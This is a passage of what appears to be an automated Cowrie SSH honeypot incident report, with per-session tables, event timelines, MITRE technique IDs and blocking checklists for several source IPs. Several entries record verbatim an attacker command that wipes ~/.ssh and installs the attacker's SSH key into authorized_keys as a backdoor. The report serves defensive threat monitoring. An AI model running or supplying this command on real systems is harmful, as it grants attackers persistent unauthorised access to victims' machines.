| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:13:46` | `cowrie.session.connect` |
| `2026-04-13 16:13:46` | `cowrie.client.version` |
| `2026-04-13 16:13:46` | `cowrie.client.kex` |
| `2026-04-13 16:13:47` | `cowrie.login.success` |
| `2026-04-13 16:13:47` | `cowrie.session.params` |
| `2026-04-13 16:13:47` | `cowrie.command.input` |
| `2026-04-13 16:13:47` | `cowrie.command.failed` |
| `2026-04-13 16:13:47` | `cowrie.log.closed` |
| `2026-04-13 16:13:48` | `cowrie.session.params` |
| `2026-04-13 16:13:48` | `cowrie.command.input` |
| `2026-04-13 16:13:48` | `cowrie.session.file_download` |
| `2026-04-13 16:13:48` | `cowrie.log.closed` |
| `2026-04-13 16:13:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.143.141[.]37` to AbuseIPDB if not already reported
- [ ] Block `94.143.141[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fe0e2573e68

| Field | Detail |
|---|---|
| **Source IP** | `94.143.141[.]37` |
| **First Seen** | 2026-04-13 16:13 |
| **Last Seen** | 2026-04-13 16:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:13:50` | `cowrie.session.connect` |
| `2026-04-13 16:13:50` | `cowrie.client.version` |
| `2026-04-13 16:13:50` | `cowrie.client.kex` |
| `2026-04-13 16:13:51` | `cowrie.login.success` |
| `2026-04-13 16:13:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.143.141[.]37` to AbuseIPDB if not already reported
- [ ] Block `94.143.141[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c47e9488f0e

| Field | Detail |
|---|---|
| **Source IP** | `87.106.46[.]37` |
| **First Seen** | 2026-04-13 16:16 |
| **Last Seen** | 2026-04-13 16:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:16:27` | `cowrie.session.connect` |
| `2026-04-13 16:16:27` | `cowrie.client.version` |
| `2026-04-13 16:16:27` | `cowrie.client.kex` |
| `2026-04-13 16:16:27` | `cowrie.login.success` |
| `2026-04-13 16:16:28` | `cowrie.session.params` |
| `2026-04-13 16:16:28` | `cowrie.command.input` |
| `2026-04-13 16:16:28` | `cowrie.command.failed` |
| `2026-04-13 16:16:28` | `cowrie.log.closed` |
| `2026-04-13 16:16:28` | `cowrie.session.params` |
| `2026-04-13 16:16:28` | `cowrie.command.input` |
| `2026-04-13 16:16:28` | `cowrie.session.file_download` |
| `2026-04-13 16:16:28` | `cowrie.log.closed` |
| `2026-04-13 16:16:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.46[.]37` to AbuseIPDB if not already reported
- [ ] Block `87.106.46[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b22cdac197a8

| Field | Detail |
|---|---|
| **Source IP** | `87.106.46[.]37` |
| **First Seen** | 2026-04-13 16:16 |
| **Last Seen** | 2026-04-13 16:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:16:31` | `cowrie.session.connect` |
| `2026-04-13 16:16:31` | `cowrie.client.version` |
| `2026-04-13 16:16:31` | `cowrie.client.kex` |
| `2026-04-13 16:16:31` | `cowrie.login.success` |
| `2026-04-13 16:16:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.46[.]37` to AbuseIPDB if not already reported
- [ ] Block `87.106.46[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-560582817c59

| Field | Detail |
|---|---|
| **Source IP** | `94.143.141[.]37` |
| **First Seen** | 2026-04-13 16:17 |
| **Last Seen** | 2026-04-13 16:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:17:07` | `cowrie.session.connect` |
| `2026-04-13 16:17:07` | `cowrie.client.version` |
| `2026-04-13 16:17:07` | `cowrie.client.kex` |
| `2026-04-13 16:17:08` | `cowrie.login.success` |
| `2026-04-13 16:17:08` | `cowrie.session.params` |
| `2026-04-13 16:17:08` | `cowrie.command.input` |
| `2026-04-13 16:17:08` | `cowrie.command.failed` |
| `2026-04-13 16:17:08` | `cowrie.log.closed` |
| `2026-04-13 16:17:09` | `cowrie.session.params` |
| `2026-04-13 16:17:09` | `cowrie.command.input` |
| `2026-04-13 16:17:09` | `cowrie.session.file_download` |
| `2026-04-13 16:17:09` | `cowrie.log.closed` |
| `2026-04-13 16:17:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.143.141[.]37` to AbuseIPDB if not already reported
- [ ] Block `94.143.141[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7fa4290f507

| Field | Detail |
|---|---|
| **Source IP** | `94.143.141[.]37` |
| **First Seen** | 2026-04-13 16:17 |
| **Last Seen** | 2026-04-13 16:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:17:11` | `cowrie.session.connect` |
| `2026-04-13 16:17:11` | `cowrie.client.version` |
| `2026-04-13 16:17:11` | `cowrie.client.kex` |
| `2026-04-13 16:17:12` | `cowrie.login.success` |
| `2026-04-13 16:17:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.143.141[.]37` to AbuseIPDB if not already reported
- [ ] Block `94.143.141[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3df447fe52f4

| Field | Detail |
|---|---|
| **Source IP** | `87.106.46[.]37` |
| **First Seen** | 2026-04-13 16:18 |
| **Last Seen** | 2026-04-13 16:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:18:11` | `cowrie.session.connect` |
| `2026-04-13 16:18:11` | `cowrie.client.version` |
| `2026-04-13 16:18:11` | `cowrie.client.kex` |
| `2026-04-13 16:18:11` | `cowrie.login.success` |
| `2026-04-13 16:18:12` | `cowrie.session.params` |
| `2026-04-13 16:18:12` | `cowrie.command.input` |
| `2026-04-13 16:18:12` | `cowrie.command.failed` |
| `2026-04-13 16:18:12` | `cowrie.log.closed` |
| `2026-04-13 16:18:12` | `cowrie.session.params` |
| `2026-04-13 16:18:12` | `cowrie.command.input` |
| `2026-04-13 16:18:12` | `cowrie.session.file_download` |
| `2026-04-13 16:18:12` | `cowrie.log.closed` |
| `2026-04-13 16:18:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.46[.]37` to AbuseIPDB if not already reported
- [ ] Block `87.106.46[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18dc4411aceb

| Field | Detail |
|---|---|
| **Source IP** | `87.106.46[.]37` |
| **First Seen** | 2026-04-13 16:18 |
| **Last Seen** | 2026-04-13 16:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:18:15` | `cowrie.session.connect` |
| `2026-04-13 16:18:15` | `cowrie.client.version` |
| `2026-04-13 16:18:15` | `cowrie.client.kex` |
| `2026-04-13 16:18:15` | `cowrie.login.success` |
| `2026-04-13 16:18:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.46[.]37` to AbuseIPDB if not already reported
- [ ] Block `87.106.46[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11fff0ccddba

| Field | Detail |
|---|---|
| **Source IP** | `183.91.11[.]36` |
| **First Seen** | 2026-04-13 16:18 |
| **Last Seen** | 2026-04-13 16:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:18:58` | `cowrie.session.connect` |
| `2026-04-13 16:18:58` | `cowrie.client.version` |
| `2026-04-13 16:18:58` | `cowrie.client.kex` |
| `2026-04-13 16:18:59` | `cowrie.login.success` |
| `2026-04-13 16:18:59` | `cowrie.session.params` |
| `2026-04-13 16:18:59` | `cowrie.command.input` |
| `2026-04-13 16:18:59` | `cowrie.command.failed` |
| `2026-04-13 16:18:59` | `cowrie.log.closed` |
| `2026-04-13 16:18:59` | `cowrie.session.params` |
| `2026-04-13 16:18:59` | `cowrie.command.input` |
| `2026-04-13 16:18:59` | `cowrie.session.file_download` |
| `2026-04-13 16:18:59` | `cowrie.log.closed` |
| `2026-04-13 16:19:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.11[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.11[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0938f269e7f

| Field | Detail |
|---|---|
| **Source IP** | `183.91.11[.]36` |
| **First Seen** | 2026-04-13 16:19 |
| **Last Seen** | 2026-04-13 16:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:19:01` | `cowrie.session.connect` |
| `2026-04-13 16:19:01` | `cowrie.client.version` |
| `2026-04-13 16:19:01` | `cowrie.client.kex` |
| `2026-04-13 16:19:02` | `cowrie.login.success` |
| `2026-04-13 16:19:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.11[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.11[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4b4c31f86a9

| Field | Detail |
|---|---|
| **Source IP** | `87.106.46[.]37` |
| **First Seen** | 2026-04-13 16:19 |
| **Last Seen** | 2026-04-13 16:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:19:56` | `cowrie.session.connect` |
| `2026-04-13 16:19:56` | `cowrie.client.version` |
| `2026-04-13 16:19:57` | `cowrie.client.kex` |
| `2026-04-13 16:19:57` | `cowrie.login.success` |
| `2026-04-13 16:19:57` | `cowrie.session.params` |
| `2026-04-13 16:19:57` | `cowrie.command.input` |
| `2026-04-13 16:19:57` | `cowrie.command.failed` |
| `2026-04-13 16:19:58` | `cowrie.log.closed` |
| `2026-04-13 16:19:58` | `cowrie.session.params` |
| `2026-04-13 16:19:58` | `cowrie.command.input` |
| `2026-04-13 16:19:58` | `cowrie.session.file_download` |
| `2026-04-13 16:19:58` | `cowrie.log.closed` |
| `2026-04-13 16:20:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.46[.]37` to AbuseIPDB if not already reported
- [ ] Block `87.106.46[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-644b1762627c

| Field | Detail |
|---|---|
| **Source IP** | `87.106.46[.]37` |
| **First Seen** | 2026-04-13 16:20 |
| **Last Seen** | 2026-04-13 16:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:20:00` | `cowrie.session.connect` |
| `2026-04-13 16:20:00` | `cowrie.client.version` |
| `2026-04-13 16:20:00` | `cowrie.client.kex` |
| `2026-04-13 16:20:01` | `cowrie.login.success` |
| `2026-04-13 16:20:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.46[.]37` to AbuseIPDB if not already reported
- [ ] Block `87.106.46[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd7fc351e35a

| Field | Detail |
|---|---|
| **Source IP** | `94.143.141[.]37` |
| **First Seen** | 2026-04-13 16:20 |
| **Last Seen** | 2026-04-13 16:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:20:39` | `cowrie.session.connect` |
| `2026-04-13 16:20:39` | `cowrie.client.version` |
| `2026-04-13 16:20:39` | `cowrie.client.kex` |
| `2026-04-13 16:20:40` | `cowrie.login.success` |
| `2026-04-13 16:20:40` | `cowrie.session.params` |
| `2026-04-13 16:20:40` | `cowrie.command.input` |
| `2026-04-13 16:20:40` | `cowrie.command.failed` |
| `2026-04-13 16:20:40` | `cowrie.log.closed` |
| `2026-04-13 16:20:41` | `cowrie.session.params` |
| `2026-04-13 16:20:41` | `cowrie.command.input` |
| `2026-04-13 16:20:41` | `cowrie.session.file_download` |
| `2026-04-13 16:20:41` | `cowrie.log.closed` |
| `2026-04-13 16:20:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.143.141[.]37` to AbuseIPDB if not already reported
- [ ] Block `94.143.141[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d7abfed2d5a

| Field | Detail |
|---|---|
| **Source IP** | `94.143.141[.]37` |
| **First Seen** | 2026-04-13 16:20 |
| **Last Seen** | 2026-04-13 16:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:20:43` | `cowrie.session.connect` |
| `2026-04-13 16:20:43` | `cowrie.client.version` |
| `2026-04-13 16:20:43` | `cowrie.client.kex` |
| `2026-04-13 16:20:44` | `cowrie.login.success` |
| `2026-04-13 16:20:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.143.141[.]37` to AbuseIPDB if not already reported
- [ ] Block `94.143.141[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdc9afe3fb64

| Field | Detail |
|---|---|
| **Source IP** | `118.196.34[.]237` |
| **First Seen** | 2026-04-13 16:20 |
| **Last Seen** | 2026-04-13 16:20 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:20:50` | `cowrie.session.connect` |
| `2026-04-13 16:20:50` | `cowrie.client.version` |
| `2026-04-13 16:20:50` | `cowrie.client.kex` |
| `2026-04-13 16:20:51` | `cowrie.login.success` |
| `2026-04-13 16:20:51` | `cowrie.session.params` |
| `2026-04-13 16:20:51` | `cowrie.command.input` |
| `2026-04-13 16:20:51` | `cowrie.command.failed` |
| `2026-04-13 16:20:51` | `cowrie.log.closed` |
| `2026-04-13 16:20:52` | `cowrie.session.params` |
| `2026-04-13 16:20:52` | `cowrie.command.input` |
| `2026-04-13 16:20:52` | `cowrie.session.file_download` |
| `2026-04-13 16:20:52` | `cowrie.log.closed` |
| `2026-04-13 16:20:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.196.34[.]237` to AbuseIPDB if not already reported
- [ ] Block `118.196.34[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bb18fbd4665

| Field | Detail |
|---|---|
| **Source IP** | `118.196.34[.]237` |
| **First Seen** | 2026-04-13 16:20 |
| **Last Seen** | 2026-04-13 16:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:20:58` | `cowrie.session.connect` |
| `2026-04-13 16:20:58` | `cowrie.client.version` |
| `2026-04-13 16:20:59` | `cowrie.client.kex` |
| `2026-04-13 16:20:59` | `cowrie.login.success` |
| `2026-04-13 16:20:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.196.34[.]237` to AbuseIPDB if not already reported
- [ ] Block `118.196.34[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eed792b9b622

| Field | Detail |
|---|---|
| **Source IP** | `101.36.127[.]212` |
| **First Seen** | 2026-04-13 16:25 |
| **Last Seen** | 2026-04-13 16:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:25:20` | `cowrie.session.connect` |
| `2026-04-13 16:25:20` | `cowrie.client.version` |
| `2026-04-13 16:25:20` | `cowrie.client.kex` |
| `2026-04-13 16:25:21` | `cowrie.login.success` |
| `2026-04-13 16:25:21` | `cowrie.session.params` |
| `2026-04-13 16:25:21` | `cowrie.command.input` |
